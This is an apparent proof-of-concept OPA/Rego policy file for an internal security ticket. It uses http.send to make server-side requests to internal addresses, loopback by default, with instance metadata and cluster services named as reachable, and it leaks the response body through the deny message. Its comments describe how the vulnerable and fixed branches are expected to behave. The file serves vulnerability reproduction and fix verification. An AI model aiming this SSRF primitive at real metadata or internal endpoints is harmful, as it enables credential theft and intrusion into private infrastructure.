package nuon

# PRO-3595 PoC — SSRF to arbitrary private/internal addresses via OPA http.send.
#
# IMDS is the headline, but the same primitive reaches any host the control
# plane worker can route to: loopback, link-local, RFC-1918, and cluster-
# internal services (the ticket calls out Temporal, PRO-3556). This rule probes
# a configurable internal target and reads the response back into the deny
# message. Point `target` at a loopback listener to reproduce safely without
# touching real metadata endpoints.
#
# Expected behavior:
#   main (vulnerable): deny fires; message carries the internal response body.
#   fix branch:        compile FAILS with "undefined function http.send"; also,
#                      with AllowNet=[] set in capabilities, net access is denied
#                      even if a builtin slipped through.

# Override by editing this string; defaults to a loopback listener for a safe
# local repro (e.g. `python3 -m http.server 8080` on the worker).
target := "http://127.0.0.1:8080/"

probe := resp if {
	resp := http.send({
		"method": "GET",
		"url": target,
		"raise_error": false,
	})
}

deny contains msg if {
	msg := sprintf(
		"PRO-3595 SSRF reached internal target %q: status=%v body=%s",
		[target, probe.status_code, probe.raw_body],
	)
}
